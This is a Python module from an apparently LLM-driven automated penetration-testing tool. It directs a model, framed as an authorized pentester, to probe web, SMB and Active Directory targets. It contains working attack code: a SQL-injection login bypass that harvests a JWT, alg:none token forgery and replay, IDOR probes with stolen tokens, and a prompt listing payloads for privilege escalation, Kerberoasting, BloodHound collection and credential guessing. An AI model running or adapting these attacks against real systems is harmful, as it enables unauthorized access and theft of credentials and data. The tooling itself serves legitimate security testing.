"""
Phase 2: Probe — 2-turn ReAct loop per hypothesis.

Turn 1: LLM receives the hypothesis + recon facts + 2-3 tools.
        It calls one tool with a crafted payload.
Turn 2: LLM receives the tool result and classifies it as
        CONFIRMED or NOT_VULNERABLE.

Maximum 2 turns. No growing context. No looping.
If the LLM declines to call a tool on turn 1, the hypothesis is skipped.
"""

from __future__ import annotations

import json
import re
import time
from urllib.parse import urljoin

from wasp.blackboard import Blackboard, Finding, severity_for_class
from wasp.llm import OllamaClient, CompletionResponse
from wasp.mitre import lookup as mitre_lookup
from wasp.planner import Hypothesis
from wasp.recon import ReconFacts
from wasp.tools import run_tool, tools_for_class, run_http_request, run_jwt_lite, searchsploit_lookup


# ---------------------------------------------------------------------------
# Auth token cache — shared across probe calls within a scan session
# ---------------------------------------------------------------------------

_auth_cache: dict[str, str] = {}   # target_url → JWT token


def _get_or_fetch_token(target_url: str, config: dict) -> str | None:
    """
    Return a cached auth token for this target, or obtain one via SQLi bypass.
    Uses the standard Juice Shop login endpoint with a known-good SQLi payload.
    Falls back gracefully if the endpoint is different or not vulnerable.
    """
    if target_url in _auth_cache:
        return _auth_cache[target_url]

    login_url = target_url.rstrip("/") + "/rest/user/login"
    args = {
        "method":  "POST",
        "url":     login_url,
        "headers": {"Content-Type": "application/json"},
        "body":    '{"email":"\'OR 1=1--","password":"x"}',
    }
    try:
        result = run_http_request(args, config, timeout=15)
        data   = json.loads(result)
        body   = data.get("body", "")
        # Extract token from body JSON
        body_data = json.loads(body) if isinstance(body, str) else body
        token = (
            body_data.get("authentication", {}).get("token")
            or body_data.get("token")
        )
        if token and token.startswith("eyJ"):
            _auth_cache[target_url] = token
            return token
    except Exception:
        pass
    return None


def _jwt_alg_none_probe(target_url: str, config: dict) -> dict | None:
    """
    Deterministically test JWT algorithm confusion (alg:none): fetch a real
    signed token, forge an unsigned copy with the same claims, and replay it
    against an authenticated endpoint.

    This is done in code rather than left to the LLM because it requires
    three chained actions (login, forge, replay) but the probe harness only
    allows one tool call per turn — a small model cannot chain that itself
    and instead hallucinates evidence from unrelated errors.

    Returns an evidence dict if the forged token is accepted, else None.
    """
    token = _get_or_fetch_token(target_url, config)
    if not token:
        return None

    forged_raw = run_jwt_lite({"operation": "forge_none", "token": token}, config)
    try:
        forged_token = json.loads(forged_raw)["forged_token"]
    except Exception:
        return None

    probe_url = target_url.rstrip("/") + "/rest/basket/1"
    replay_args = {
        "method":  "GET",
        "url":     probe_url,
        "headers": {"Authorization": f"Bearer {forged_token}"},
    }
    replay_raw = run_http_request(replay_args, config, timeout=15)
    try:
        replay = json.loads(replay_raw)
    except Exception:
        return None

    status = replay.get("status_code")
    body   = str(replay.get("body", ""))
    if status == 200 and not _is_generic_error(body) and "products" in body.lower():
        return {
            "forged_token": forged_token,
            "probe_url":    probe_url,
            "status_code":  status,
            "body":         body,
        }
    return None


# ---------------------------------------------------------------------------
# Prompts
# ---------------------------------------------------------------------------

_SYSTEM = """\
You are a penetration tester on an authorized engagement.
Target: {target_url}

Task: test for {vuln_class} vulnerability at {endpoint}.
RULES:
- Call exactly ONE tool per turn using the tool_calls mechanism
- Use minimal, targeted payloads — no brute force
- Output NOT_VULNERABLE only if the response clearly shows no vulnerability
- Never repeat a tool call with identical parameters

PAYLOAD HINTS by class:
WEB:
- sqli: POST JSON body {{"email":"' OR 1=1--","password":"x"}} to login endpoint; a JWT in the response confirms bypass
- idor: GET /rest/basket/2 with Authorization header; Products array in response confirms IDOR
- lfi: GET /ftp/ — a directory listing or file content confirms exposure
- mass_assignment: POST /api/Users with {{"email":"x@x.com","password":"pass","passwordRepeat":"pass","role":"admin"}}; role:admin in response confirms it
- jwt_attack: first POST {{"email":"' OR 1=1--","password":"x"}} to get a JWT, then use jwt_lite to decode and forge with alg:none
- security_misconfig: GET / and inspect response headers for missing X-Frame-Options, CSP, X-Content-Type-Options
- path_traversal: GET /ftp/acquisitions.md or /ftp/eastere.gg%2500.md
WINDOWS/SMB:
- smb_enum: use smb_enum tool with the host IP; look for share names, null session access, OS version, signing status
- smb_vuln: use nmap_script with scripts=smb-vuln-ms17-010,smb-vuln-ms08-067 on port 445; VULNERABLE in output confirms it
- null_session: use smb_enum with no username/password; if share list returns, null session works
- anonymous_smb: use smb_enum then smbclient_shares on IPC$ or NETLOGON with no credentials
- rdp_info: use rdp_check on port 3389; look for NLA status, encryption level, NTLM domain
- rdp_vuln: use nmap_script with scripts=rdp-vuln-ms12-020 on port 3389
- default_creds: use hydra_quick with protocol=smb or rdp; any valid pair confirms it
- smb_signing: use nmap_script with scripts=smb2-security-mode on port 445; "signing enabled but not required" is exploitable
ACTIVE DIRECTORY:
- ad_enum: use nmap_script with scripts=ldap-rootdse,ldap-search on port 389; domain info confirms AD
- asreproast: use impacket_npusers with dc_ip and domain; hash output confirms vulnerable accounts
- kerberoast: use impacket_spns with dc_ip and domain; $krb5tgs hash confirms Kerberoastable SPNs
- ad_null_bind: use nmap_script with scripts=ldap-rootdse on port 389; success without credentials confirms null bind
- ad_bloodhound: use bloodhound_collect with dc_ip, domain, username, password (needs a valid domain account, e.g. one recovered via kerberoast/asreproast); a completed collection with a saved zip confirms attack-path data was harvested
LINUX SERVICES:
- ssh_audit: use nmap_script with scripts=ssh-hostkey,ssh2-enum-algos,sshv1 on port 22
- ftp_anon: use nmap_script with scripts=ftp-anon on port 21; "Anonymous FTP login allowed" confirms it
- snmp_enum: use snmp_enum with host; any system info returned confirms community string access
- smtp_enum: use nmap_script with scripts=smtp-commands,smtp-enum-users on port 25
- db_enum: use nmap_script with scripts=mysql-info,ms-sql-info on port 3306/1433; version info confirms access
- banner_info: use banner_grab on any open port; version strings in banner confirm info disclosure

Known facts:
{recon_summary}"""

_TURN1_PROMPT = """\
Hypothesis: {vuln_class} at {endpoint}
Reason: {rationale}

Call the most appropriate tool now to test this hypothesis. Use the payload hints above."""

_TURN2_PROMPT = """\
Tool used: {tool_name}
Request: {request_summary}
Response:
{result}

Does this response CONFIRM the {vuln_class} vulnerability?
Reply with exactly one of:
  CONFIRMED: <one sentence describing the evidence>
  NOT_VULNERABLE: <one sentence explaining why>"""


# ---------------------------------------------------------------------------
# Core loop
# ---------------------------------------------------------------------------

def probe_hypothesis(
    hypothesis: Hypothesis,
    facts: ReconFacts,
    llm: OllamaClient,
    board: Blackboard,
    config: dict,
) -> Finding | None:
    """
    Run the 2-turn probe for a single hypothesis.
    Returns a Finding if confirmed, None otherwise.
    """
    if board.already_tested(hypothesis.key):
        return None

    board.mark_tested(hypothesis.key)

    tool_timeout = config.get("lite", {}).get("tool_timeout_s", 45)
    result_limit = config.get("lite", {}).get("result_truncate_chars", 2048)

    # Resolve the endpoint to a full URL
    target_url  = facts.target_url.rstrip("/")
    endpoint    = hypothesis.endpoint
    probe_url   = endpoint if endpoint.startswith("http") else urljoin(target_url + "/", endpoint.lstrip("/"))

    # Build context
    system_prompt = _SYSTEM.format(
        target_url   = target_url,
        vuln_class   = hypothesis.vuln_class,
        endpoint     = probe_url,
        recon_summary= facts.to_summary(),
    )

    # --- IDOR special case: pre-fetch auth token and inject into turn 1 ---
    token_hint = ""
    if hypothesis.vuln_class == "idor":
        token = _get_or_fetch_token(target_url, config)
        if token:
            token_hint = (
                f"\n\nAUTH TOKEN (obtained via SQLi bypass — use this):\n"
                f"Authorization: Bearer {token}\n"
                f"Send GET {probe_url.rstrip('/')} and also GET "
                f"{target_url.rstrip('/')}/rest/basket/2 with this token. "
                f"A Products array in the response confirms IDOR."
            )

    # --- JWT algorithm confusion: deterministic, no LLM guessing ---
    # (requires 3 chained actions the model can't do in one tool call)
    if hypothesis.vuln_class == "jwt_attack":
        evidence = _jwt_alg_none_probe(target_url, config)
        if evidence is None:
            return None
        mitre = mitre_lookup(hypothesis.vuln_class)
        finding = Finding(
            vuln_class      = hypothesis.vuln_class,
            title           = _title_for(hypothesis.vuln_class, probe_url),
            severity        = severity_for_class(hypothesis.vuln_class),
            target_url      = probe_url,
            evidence        = json.dumps(evidence)[:1500],
            request_method  = "GET",
            request_url     = evidence["probe_url"],
            request_body    = "",
            request_headers = {"Authorization": f"Bearer {evidence['forged_token']}"},
            description     = "",
            mitre_id        = mitre.technique_id,
            mitre_technique = mitre.technique,
            mitre_tactic    = mitre.tactic,
            mitre_url       = mitre.url,
        )
        board.add_finding(finding)
        return finding

    # --- Turn 1: LLM proposes a tool call ---
    turn1_prompt = _TURN1_PROMPT.format(
        vuln_class = hypothesis.vuln_class,
        endpoint   = probe_url,
        rationale  = hypothesis.rationale,
    ) + token_hint

    available_tools = tools_for_class(hypothesis.vuln_class)

    t0 = time.monotonic()
    resp1 = llm.complete(
        system  = system_prompt,
        prompt  = turn1_prompt,
        tools   = available_tools,
    )

    if resp1.tool_call is None:
        # Model declined to act — hypothesis skipped
        return None

    tool_name = resp1.tool_call.name
    tool_args = resp1.tool_call.arguments

    if tool_name in ("bloodhound_collect", "smb_enum", "crackmapexec_scan"):
        creds = config.get("credentials", {})
        if creds.get("username"):
            tool_args["username"] = creds["username"]
        if creds.get("password"):
            tool_args["password"] = creds["password"]

    # Execute the tool
    raw_result = run_tool(tool_name, tool_args, config, timeout=int(tool_timeout))
    truncated  = raw_result[:result_limit]

    # Generic framework errors (bad route, malformed request) are never
    # evidence of a vulnerability — skip turn 2 so a small model can't
    # hallucinate CONFIRMED off a 404/parse error it doesn't recognise.
    if _is_generic_error(raw_result):
        return None

    # --- Turn 2: LLM classifies the result ---
    request_summary = _summarise_request(tool_name, tool_args)

    turn2_prompt = _TURN2_PROMPT.format(
        tool_name       = tool_name,
        request_summary = request_summary,
        result          = truncated,
        vuln_class      = hypothesis.vuln_class,
    )

    resp2 = llm.complete(
        system = system_prompt,
        prompt = turn2_prompt,
        # No tools in turn 2 — classification only
    )

    elapsed = time.monotonic() - t0

    verdict, detail = _parse_verdict(resp2.text)

    # Belt-and-braces: if the raw tool result contains unmistakable evidence,
    # confirm even if the LLM hedged — small models frequently under-call.
    if verdict == "NOT_VULNERABLE":
        verdict, detail = _evidence_confirm(hypothesis.vuln_class, raw_result, verdict, detail)

    # Classes whose whole verdict rests on a deterministic nmap NSE script
    # result give the model no ambiguous prose to reason about — an empty
    # or silent script run is not evidence, so CONFIRMED without a matching
    # signal is a hallucination, not a hedge. Downgrade it.
    if verdict == "CONFIRMED" and hypothesis.vuln_class in _SCRIPT_VERDICT_CLASSES:
        if not _has_signal(hypothesis.vuln_class, raw_result):
            verdict, detail = "NOT_VULNERABLE", ""

    if verdict == "CONFIRMED":
        mitre = mitre_lookup(hypothesis.vuln_class)
        cve = _extract_cve(raw_result)
        finding = Finding(
            vuln_class      = hypothesis.vuln_class,
            title           = _title_for(hypothesis.vuln_class, probe_url),
            severity        = severity_for_class(hypothesis.vuln_class),
            target_url      = probe_url,
            evidence        = truncated[:1500],
            request_method  = tool_args.get("method", "GET") if tool_name == "http_request" else tool_name,
            request_url     = tool_args.get("url", probe_url),
            request_body    = str(tool_args.get("body", ""))[:500],
            request_headers = tool_args.get("headers", {}),
            description     = "",   # left blank — report phase writes accurate PoC
            mitre_id        = mitre.technique_id,
            mitre_technique = mitre.technique,
            mitre_tactic    = mitre.tactic,
            mitre_url       = mitre.url,
            cvss            = _extract_cvss(raw_result) if tool_name == "nuclei_quick" else None,
            cve             = cve,
            exploit_refs    = searchsploit_lookup(cve)[:1500] if cve else "",
        )
        board.add_finding(finding)
        return finding

    return None


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _is_generic_error(raw_result: str) -> bool:
    """
    True if the tool response is a generic framework/routing error rather
    than evidence relevant to any vulnerability class (e.g. an Express
    "Unexpected path" 404 or a JSON parse error from a malformed request).
    """
    r = raw_result.lower()
    markers = (
        "unexpected path:",
        "cannot get ", "cannot post ", "cannot put ", "cannot delete ",
        "syntaxerror: expected property name",
        "syntaxerror: unexpected token",
        "syntaxerror: unexpected end of json input",
        "no authorization header was found",
        "jwt malformed", "jsonwebtokenerror",
    )
    return any(m in r for m in markers)


def _parse_verdict(text: str) -> tuple[str, str]:
    """
    Extract CONFIRMED / NOT_VULNERABLE from the model's turn-2 response.
    Returns (verdict, detail_sentence).
    """
    clean = text.strip()
    upper = clean.upper()

    # Strict prefix match
    if upper.startswith("CONFIRMED"):
        detail = clean[len("CONFIRMED"):].lstrip(":").strip()
        return "CONFIRMED", detail[:300]
    if upper.startswith("NOT_VULNERABLE") or upper.startswith("NOT VULNERABLE"):
        detail = re.sub(r"^NOT[_ ]VULNERABLE", "", clean, flags=re.IGNORECASE).lstrip(":").strip()
        return "NOT_VULNERABLE", detail[:300]

    lower = clean.lower()

    # Strong confirmation signals
    confirm_words = (
        "confirmed", "vulnerable", "injectable", "bypass succeeded",
        "authentication bypass", "jwt returned", "eyj",      # JWT prefix
        "role.*admin", "admin.*role",
        "\"role\":\"admin\"",
        "products.*array", "basket.*success",
        "acquisitions", "eastere",                            # Juice Shop LFI files
        "x-frame-options.*missing", "missing.*header",
        "exploitable", "exposed", "leaked", "directory listing",
    )

    # Strong rejection signals
    reject_words = (
        "not vulnerable", "not injectable", "no vulnerability",
        "not exploitable", "no evidence", "no injection",
        "not confirmed", "no sqli", "parameter.*not.*injectable",
        "does not appear", "cannot confirm",
    )

    reject_score  = sum(1 for w in reject_words  if re.search(w, lower))
    confirm_score = sum(1 for w in confirm_words if re.search(w, lower))

    if reject_score > confirm_score:
        return "NOT_VULNERABLE", clean[:300]
    if confirm_score > 0:
        return "CONFIRMED", clean[:300]

    return "NOT_VULNERABLE", clean[:300]


# Substrings whose presence in raw tool output is unmistakable evidence of
# exploitation for a given vuln class. Used both to upgrade a hedged
# NOT_VULNERABLE verdict and to reject an unwarranted CONFIRMED one.
_SIGNALS: dict[str, list[str]] = {
    # Web
    "sqli":            ["\"token\":\"eyj", "authentication", "\"role\":\"admin\"", "umail"],
    "auth_bypass":     ["\"token\":\"eyj", "authentication", "logged in"],
    "jwt_attack":      ["\"email\":", "admin@", "customer@"],
    "idor":            ["\"products\":", "basketitem", "\"userid\""],
    "mass_assignment": ["\"role\":\"admin\"", "\"role\": \"admin\""],
    "lfi":             ["acquisitions", "eastere", "confidential", "this document"],
    "path_traversal":  ["acquisitions", "eastere", "confidential", "root:x:"],
    "security_misconfig": ["osvdb", "server leaks", "x-frame-options", "nikto"],
    "outdated_components": ["cve-", "[critical]", "[high]"],
    "xss_reflected":   ["<script", "alert(", "onerror="],
    "info_disclosure": ["password", "secret", "api_key", "private"],
    # Windows / SMB
    "smb_enum":        ["sharename"],
    "smb_vuln":        ["state: vulnerable", "ms17-010", "ms08-067", "eternalblue"],
    "smb_signing":     ["signing enabled but not required", "message_signing: disabled"],
    "null_session":    ["sharename", "ipc$", "netlogon", "sysvol"],
    "anonymous_smb":   ["sharename", "ipc$", "anonymous"],
    "rdp_info":        ["rdp", "ntlm", "domain:", "computer name", "rdp-ntlm-info"],
    "rdp_vuln":        ["state: vulnerable", "ms12-020"],
    "default_creds":   ["login:", "1 valid password", "host:", "[success]", "successfully authenticated"],
    # Active Directory
    "ad_enum":         ["namingcontexts", "defaultnamingcontext", "dnsroot", "ldap"],
    "asreproast":      ["$krb5asrep$", "as-rep", "hash"],
    "kerberoast":      ["$krb5tgs$", "spn", "service ticket"],
    "ad_null_bind":    ["namingcontexts", "defaultnamingcontext", "success"],
    "ad_bloodhound":   ["compressing output", "done in", "found ad domain"],
    "ad_pivot":        ["pwn3d!"],
    # Linux services
    "ssh_audit":       ["ssh-", "ecdsa", "rsa", "ed25519", "ssh_host"],
    "ftp_anon":        ["anonymous ftp login allowed", "230", "ftp-anon"],
    "snmp_enum":       ["sysname", "sysdescr", "sysuptime", "enterprises"],
    "smtp_enum":       ["220", "ehlo", "vrfy", "expn", "smtp"],
    "db_enum":         ["version:", "mysql", "mssql", "postgres", "database:"],
    "banner_info":     ["ssh-", "ftp", "smtp", "220", "230", "http/", "server:"],
    "tls_weak":        ["sslv3", "tlsv1.0", "tlsv1.1", "least strength: c",
                         "least strength: d", "least strength: f"],
}


def _evidence_confirm(vuln_class: str, raw_result: str, verdict: str, detail: str) -> tuple[str, str]:
    """
    Scan the raw tool output for unmistakable evidence of exploitation.
    Overrides a NOT_VULNERABLE LLM verdict when evidence is clear.
    This compensates for small models that under-call on turn 2.
    """
    sig = _matching_signal(vuln_class, raw_result.lower())
    if sig:
        return "CONFIRMED", f"Evidence detected in response: '{sig}' pattern found"

    return verdict, detail


def _matching_signal(vuln_class: str, lowered_result: str) -> str:
    """Return the first _SIGNALS entry found in lowered_result, else ''."""
    for sig in _SIGNALS.get(vuln_class.lower(), []):
        # "vulnerable" is a substring of nmap's own "NOT VULNERABLE" state
        # line — skip a match sitting right after a "not " negation.
        if sig in lowered_result and f"not {sig}" not in lowered_result:
            return sig
    return ""


def _has_signal(vuln_class: str, raw_result: str) -> bool:
    return bool(_matching_signal(vuln_class, raw_result.lower()))


# Vuln classes whose evidence is a deterministic nmap NSE script verdict
# (e.g. smb-vuln-ms17-010's "State: VULNERABLE" line) rather than something
# an LLM needs to interpret from prose — a CONFIRMED verdict here must be
# backed by a real _SIGNALS match or it's a guess, not a finding.
_SCRIPT_VERDICT_CLASSES = {"smb_vuln", "rdp_vuln", "tls_weak", "ad_bloodhound", "ad_pivot", "smb_enum", "null_session", "smb_signing"}

_CVSS_RE = re.compile(r"CVSS-SCORE:\s*([\d.]+)")
_CVE_RE  = re.compile(r"CVE-\d{4}-\d{4,7}")


def _extract_cvss(raw_result: str) -> float | None:
    """Pull the highest CVSS score out of nuclei_quick's rendered output
    (see tools._render_nuclei_jsonl). None if no template carried one."""
    scores = [float(m) for m in _CVSS_RE.findall(raw_result)]
    return max(scores) if scores else None


def _extract_cve(raw_result: str) -> str:
    """Pull unique CVE IDs out of any tool's rendered output, comma-separated."""
    seen: list[str] = []
    for m in _CVE_RE.findall(raw_result):
        if m not in seen:
            seen.append(m)
    return ", ".join(seen)


def _self_check():
    assert _evidence_confirm("smb_vuln", "Host script results:\n  State: NOT VULNERABLE", "NOT_VULNERABLE", "") == ("NOT_VULNERABLE", "")
    assert _evidence_confirm("smb_vuln", "Host script results:\n  State: VULNERABLE", "NOT_VULNERABLE", "")[0] == "CONFIRMED"
    assert _evidence_confirm("rdp_vuln", "likely not vulnerable", "NOT_VULNERABLE", "") == ("NOT_VULNERABLE", "")
    assert _has_signal("smb_vuln", "PORT 445/tcp open microsoft-ds") is False
    assert _has_signal("smb_vuln", "State: VULNERABLE") is True
    assert _extract_cvss("[critical] foo | CVE: CVE-2021-1 | CVSS-SCORE: 9.8") == 9.8
    assert _extract_cvss("[high] foo") is None
    assert _extract_cve("MS17-010 (CVE-2017-0144), also CVE-2017-0144") == "CVE-2017-0144"
    assert _extract_cve("no CVE here") == ""
    assert _has_signal("tls_weak", "|   TLSv1.0:\n|     least strength: C") is True
    assert _has_signal("tls_weak", "|   TLSv1.3:\n|     least strength: A") is False
    assert "ad_bloodhound" in _SCRIPT_VERDICT_CLASSES
    assert _has_signal("ad_bloodhound", "INFO: Compressing output into 20260909_bloodhound.zip") is True
    assert _has_signal("ad_bloodhound", "ERROR: Could not connect to LDAP") is False
    assert _title_for("ad_bloodhound", "/") == "Active Directory Attack Path Data Collected (BloodHound) — /"
    assert "ad_pivot" in _SCRIPT_VERDICT_CLASSES
    assert _has_signal("ad_pivot", "SMB  10.0.0.5  445  DC01  [+] corp.local\\admin:pass (Pwn3d!)") is True
    assert _has_signal("ad_pivot", "SMB  10.0.0.5  445  DC01  [-] corp.local\\admin:pass STATUS_LOGON_FAILURE") is False
    assert _title_for("ad_pivot", "/") == "Lateral Movement — Credential Grants Local Admin (Pwn3d!) — /"
    # Regression: closed-port SMB scan must not confirm smb_enum/null_session
    # just because "netbios"/"domain" appear in nmap's own port-table noise.
    assert "smb_enum" in _SCRIPT_VERDICT_CLASSES
    assert "null_session" in _SCRIPT_VERDICT_CLASSES
    assert "smb_signing" in _SCRIPT_VERDICT_CLASSES
    _closed_port_evidence = (
        "do_connect: Connection to 10.0.0.5 failed (Error NT_STATUS_CONNECTION_REFUSED)\n"
        "PORT    STATE  SERVICE\n139/tcp closed netbios-ssn\n445/tcp closed microsoft-ds"
    )
    assert _has_signal("smb_enum", _closed_port_evidence) is False
    assert _has_signal("null_session", _closed_port_evidence) is False
    assert _has_signal("smb_enum", "Sharename       Type      Comment\n\tADMIN$          Disk") is True
    assert _has_signal("smb_signing", "Message signing enabled and required") is False
    assert _has_signal("smb_signing", "Message signing enabled but not required") is True


if __name__ == "__main__":
    _self_check()
    print("ok")


def _summarise_request(tool_name: str, args: dict) -> str:
    """One-line summary of what the tool was asked to do."""
    if tool_name == "http_request":
        method = args.get("method", "GET")
        url    = args.get("url", "")
        body   = args.get("body", "")
        summary = f"{method} {url}"
        if body:
            summary += f" body={body[:120]}"
        return summary
    if tool_name == "sqlmap_quick":
        return f"sqlmap -u {args.get('url','')} --data={args.get('data','')[:80]}"
    if tool_name == "jwt_lite":
        return f"jwt_lite op={args.get('operation','')} token={args.get('token','')[:40]}..."
    if tool_name == "nikto_quick":
        return f"nikto {args.get('url','')}"
    if tool_name == "nuclei_quick":
        return f"nuclei {args.get('url','')}"
    return json.dumps(args)[:120]


def _title_for(vuln_class: str, url: str) -> str:
    """Human-readable finding title."""
    _TITLES = {
        # Web
        "sqli":               "SQL Injection",
        "auth_bypass":        "Authentication Bypass",
        "jwt_attack":         "JWT Algorithm Confusion (alg:none)",
        "idor":               "Insecure Direct Object Reference (IDOR)",
        "mass_assignment":    "Mass Assignment — Privilege Escalation",
        "path_traversal":     "Path Traversal",
        "lfi":                "Local File Inclusion / Directory Listing",
        "xss_reflected":      "Reflected Cross-Site Scripting (XSS)",
        "xss_stored":         "Stored Cross-Site Scripting (XSS)",
        "security_misconfig": "Security Misconfiguration",
        "outdated_components":"Vulnerable / Outdated Components",
        "info_disclosure":    "Sensitive Information Disclosure",
        # Windows / SMB
        "smb_enum":           "SMB Enumeration — Shares and Users Accessible",
        "smb_vuln":           "SMB Remote Code Execution Vulnerability",
        "smb_signing":        "SMB Signing Disabled — Relay Attack Risk",
        "null_session":       "SMB Null Session Allowed",
        "anonymous_smb":      "Anonymous SMB Access",
        "rdp_info":           "RDP Service Fingerprint",
        "rdp_vuln":           "RDP Remote Code Execution Vulnerability",
        "default_creds":      "Default Credentials Accepted",
        # Active Directory
        "ad_enum":            "Active Directory Enumeration via LDAP",
        "kerberoast":         "Kerberoastable Service Accounts Found",
        "asreproast":         "AS-REP Roastable Accounts Found",
        "ad_null_bind":       "LDAP Null Bind Allowed",
        "ad_password_policy": "Weak AD Password Policy",
        "ad_bloodhound":      "Active Directory Attack Path Data Collected (BloodHound)",
        "ad_pivot":           "Lateral Movement — Credential Grants Local Admin (Pwn3d!)",
        # Linux / services
        "ssh_audit":          "SSH Configuration and Algorithm Disclosure",
        "ftp_anon":           "Anonymous FTP Access Allowed",
        "snmp_enum":          "SNMP Community String Accessible",
        "smtp_enum":          "SMTP User Enumeration",
        "db_enum":            "Database Service Accessible / Info Disclosure",
        "banner_info":        "Service Banner Version Disclosure",
        # Generic
        "open_service":       "Unexpected Service Exposed",
        "firewall_bypass":    "Firewall Rule Bypass",
        "tls_weak":           "Weak TLS Configuration",
    }
    base = _TITLES.get(vuln_class, vuln_class.replace("_", " ").title())
    # Append path for clarity
    from urllib.parse import urlparse
    path = urlparse(url).path or "/"
    return f"{base} — {path}"
